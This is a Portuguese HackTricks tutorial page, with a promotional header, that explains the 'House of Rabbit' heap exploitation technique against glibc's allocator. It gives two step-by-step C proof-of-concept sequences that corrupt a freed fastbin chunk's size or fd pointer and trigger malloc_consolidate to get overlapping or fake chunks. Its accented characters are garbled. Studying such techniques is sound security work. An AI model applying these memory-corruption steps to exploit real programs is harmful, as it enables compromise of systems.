# Casa do Coelho

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

### Requisitos

1. **Capacidade de modificar o ponteiro fd ou tamanho do fast bin**: Isso significa que voc√™ pode alterar o ponteiro para frente de um peda√ßo no fastbin ou seu tamanho.
2. **Capacidade de acionar `malloc_consolidate`**: Isso pode ser feito alocando um grande peda√ßo ou mesclando o peda√ßo superior, o que for√ßa o heap a consolidar peda√ßos.

### Objetivos

1. **Criar peda√ßos sobrepostos**: Para ter um peda√ßo sobreposto com outro, permitindo manipula√ß√µes adicionais no heap.
2. **Forjar peda√ßos falsos**: Para enganar o alocador a tratar um peda√ßo falso como um peda√ßo leg√≠timo durante opera√ß√µes no heap.

## Etapas do ataque

### POC 1: Modificar o tamanho de um peda√ßo fast bin

**Objetivo**: Criar um peda√ßo sobreposto manipulando o tamanho de um peda√ßo fastbin.

* **Passo 1: Alocar Peda√ßos**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
* **Passo 2: Liberar Chunks**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
* **Passo 3: Modificar o Tamanho do Chunk**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
* **Passo 4: Acionar `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Alocar um grande bloco aciona a fun√ß√£o `malloc_consolidate`, mesclando pequenos blocos no fast bin. O tamanho manipulado do `chunk1` faz com que ele se sobreponha ao `chunk2`.

Ap√≥s a consolida√ß√£o, o `chunk1` se sobrep√µe ao `chunk2`, permitindo uma explora√ß√£o adicional.

### POC 2: Modificar o ponteiro `fd`

**Objetivo**: Criar um bloco falso manipulando o ponteiro `fd` do fast bin.

* **Passo 1: Alocar Blocos**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Explica√ß√£o**: Alocamos dois blocos, um menor e um maior, para configurar o heap para o bloco falso.

* **Passo 2: Criar bloco falso**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
* **Passo 3: Liberar `chunk1`**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Explica√ß√£o**: Liberamos o `chunk1`, adicionando-o √† lista fastbin.

* **Passo 4: Modificar `fd` do `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Explica√ß√£o**: Alteramos o ponteiro para frente (`fd`) do `chunk1` para apontar para o nosso chunk falso dentro do `chunk2`.

* **Passo 5: Acionar `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Alocar um grande bloco novamente aciona o `malloc_consolidate`, que processa o bloco falso.

O bloco falso passa a fazer parte da lista fastbin, tornando-se um bloco leg√≠timo para futuras explora√ß√µes.

### Resumo

A t√©cnica **House of Rabbit** envolve modificar o tamanho de um bloco fast bin para criar blocos sobrepostos ou manipular o ponteiro `fd` para criar blocos falsos. Isso permite que os atacantes forjem blocos leg√≠timos no heap, possibilitando v√°rias formas de explora√ß√£o. Compreender e praticar esses passos ir√° aprimorar suas habilidades de explora√ß√£o de heap.
